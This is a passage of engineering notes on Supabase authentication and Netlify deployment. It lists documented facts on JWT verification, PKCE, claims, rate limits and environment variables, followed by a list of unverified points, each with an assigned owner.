- Supabase's recommended verification is a JWKS + jose example; HS256 → `/auth/v1/user` fallback; JWKS edge cache 10 min; don't cache longer.
- The claim list: no `email_verified` claim. `aud` is `string | string[]`. Anon and service-role tokens use `iss: "supabase"`.
- `email_confirmed_at` semantics; `user_metadata` is user-editable; unconfirmed identities are removed on linking.
- PKCE: code valid 5 min, single use, verifier local. The implicit flow puts tokens in the fragment.
- Redirect URLs must match the allow-list; use exact URLs in production.
- "Allow new users to sign up": disabled → "only existing users can sign in".
- Session time-box and inactivity limits are Pro-only. Refresh tokens never expire. The default JWT expiry is 1 h.
- The publishable key is safe to expose. `anon`/`service_role` are deprecated in early 2027.
- `/auth/v1/user` is in the IP bucket "30 requests per 5 minutes".
- jose option semantics (`algorithms`, `requiredClaims`, `maxTokenAge`, `clockTolerance`) and the JWKS cache defaults; jose error class names.
- Netlify: env changes need a new deploy; the AI Gateway auto-injects `ANTHROPIC_API_KEY`/`ANTHROPIC_BASE_URL` unless set; `NETLIFY_AI_GATEWAY_KEY` is always injected.

**Not verified (must be checked; owner in brackets):**
- The default `flowType` of `supabase-js` `createClient` → we set `pkce` explicitly. [agent-console-engineer]
- That the sign-up switch blocks a first-time Google user → M1. [qa-engineer]
- That `/auth/v1/user` rejects a token after global sign-out → M3. [qa-engineer]
- Whether the `/user` rate limit applies to GET. [planned for the stricter reading]
- That `app_metadata` is not user-editable (no page I read states it). [low impact: the `OWNER_EMAILS` and strict checks still apply]
- The exact Google redirect URI value → read it from the Supabase dashboard. [owner]
- iOS standalone PWA behaviour with `sessionStorage` + PKCE → M4. [pwa-mobile-engineer]
- How Netlify merges two `[[headers]]` CSP rules → avoided by using one CSP. [netlify-engineer]
- Google OAuth *Testing* mode limiting sign-in to test users (Google docs not read). [optional hardening]
- Disabling Netlify AI Features on Free; the `netlify env:set --secret` flag; `NPM_FLAGS=--ignore-scripts`. [netlify-engineer]
